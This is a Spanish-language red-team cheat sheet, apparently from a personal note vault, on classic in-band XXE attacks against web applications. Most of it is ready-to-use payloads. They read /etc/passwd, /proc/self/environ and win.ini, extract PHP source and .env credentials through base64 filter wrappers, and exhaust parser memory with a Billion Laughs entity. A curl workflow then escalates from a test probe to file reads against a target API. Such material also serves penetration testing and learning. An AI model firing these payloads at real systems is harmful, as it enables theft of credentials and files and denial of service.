---
aliases: null
tags:
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
  - "[[Web]]"
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - Clásico In-band

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | Contenido de `/etc/passwd` reflejado en el nodo `<foo>` | Probe inicial LFI in-band. Parser resuelve entities externos. |
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>` | Hostname del backend | Confirmación rápida sin caracteres XML-rompedores. |
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>` | Source PHP en base64 | Target PHP, el archivo contiene `<`/`&`/`>`. |
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/.env">]><foo>&xxe;</foo>` | `.env` con credenciales en base64 | Target PHP/Laravel, exfil de secretos. |
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>` | Variables de entorno del proceso | Backend Linux, leak de `DB_PASSWORD`/tokens. |
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>` | `win.ini` reflejado | Target Windows, prueba canónica. |
| `<!DOCTYPE foo [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><foo>&c;</foo>` | Memoria del parser exhaust → DoS | Billion Laughs, parser sin entity-expansion-limit. |
^xxe-clasico-inband

### Workflow rápido

```bash
# 1. Confirmar resolución de entities con probe inocuo
curl -X POST https://target/api -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE foo [<!ENTITY test "OK_XXE">]><foo>&test;</foo>'
# Si la respuesta contiene OK_XXE → parser resuelve entities

# 2. Escalar a file://
curl -X POST https://target/api -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'

# 3. Si el archivo tiene caracteres XML-rompedores → wrapper base64 (PHP)
curl -X POST https://target/api -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
```

___

## Overview

XXE _in-band_ ocurre cuando la aplicación procesa un documento XML de forma insegura y devuelve el valor de la entidad externa procesada **directamente dentro de la respuesta HTTP**. Esto permite confirmar y recuperar el resultado en la misma transacción.

### Limitaciones

- **Caracteres reservados:** archivos con `<`/`&`/`>` rompen el parser. Usar wrapper `php://filter/convert.base64-encode/resource=` (PHP) o pivotar a [[XXE - Blind Basado en Errores]].
- **Reflejo:** la entidad `&xxe;` debe estar en el nodo que la aplicación devuelve. Si no se refleja → pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]].
- **DTDs deshabilitados:** parsers modernos (Java SAX/StAX con `supportDTD=false`, .NET con `DtdProcessing=Prohibit`) rechazan el `DOCTYPE` antes de procesar entities.

***
